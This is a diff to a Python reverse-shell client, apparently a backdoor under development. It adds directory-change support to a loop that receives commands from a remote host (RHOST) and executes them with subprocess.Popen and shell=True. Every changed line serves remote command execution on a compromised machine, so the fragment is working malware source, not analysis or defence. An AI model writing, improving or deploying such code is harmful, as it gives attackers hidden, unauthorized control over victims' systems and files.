@@ -4,6 +4,7 @@ import socket
 import subprocess
 import json
 import time
+import os
 
 # Variables
 RHOST = "127.0.0.1"
@@ -45,9 +46,22 @@ def shell():
 	while True:
 		# Send/Receive commands
 		command = reliable_recv()
-		if(command == "q" or command == "exit"):
+
+		if command == "q" or command == "exit":
 			print("Connection Closed!")
 			break
+		elif command[:2] == "cd" or command[:2] == "cd " and command[3:].replace(" ", "") == "":
+			if len(command) > 2:
+				if command[2] != " ":
+					reliable_send("Can't execute that command!")
+				else:
+					try:
+						os.chdir(command[3:])
+						reliable_send("")
+					except FileNotFoundError:
+						reliable_send("No such file or directory")
+			else:
+				reliable_send("")
 		else:
 			try:
 				proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
